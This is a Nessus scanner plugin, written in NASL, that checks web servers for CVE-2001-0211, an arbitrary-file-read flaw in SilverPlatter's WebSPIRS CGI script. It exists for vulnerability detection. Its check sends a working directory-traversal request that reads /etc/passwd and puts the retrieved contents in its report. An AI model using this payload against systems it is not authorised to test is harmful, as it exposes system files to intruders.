
# This script was written by Laurent Kitzinger <lkitzinger@yahoo.fr>
#
# See the Nessus Scripts License for details
#

 desc["english"] = "
Synopsis :

The remote web server contains a CGI script that is prone to
information disclosure. 

Description :

The remote host is running WebSPIRS, SilverPlatter's Information
Retrieval System for the World Wide Web. 

The installed version of WebSPIRS has a well known security flaw that
lets an attacker read arbitrary files with the privileges of the http
daemon (usually root or nobody). 

See also :

http://archives.neohapsis.com/archives/bugtraq/2001-02/0217.html

Solution : 

Remove this CGI script.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:P/A:N/I:N/B:C)";


if(description)
{
 script_id(10616);
 script_bugtraq_id(2362);
 script_version ("$Revision: 1.16 $");
 script_cve_id("CVE-2001-0211");
 
 name["english"] = "webspirs.cgi";

 script_name(english:name["english"]);
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of webspirs.cgi";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Laurent Kitzinger");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = http_get(item:string(dir, "/webspirs.cgi?sp.nextform=../../../../../../../../../etc/passwd"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( r == NULL ) exit(0);		
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r)) {
    if (report_verbosity > 0) {
      report = string(
        desc["english"],
        "\n",
        "Plugin output :\n",
        "\n",
        r
      );
    }
    else report = desc["english"];

    security_warning(port:port, data:report);
 }
}
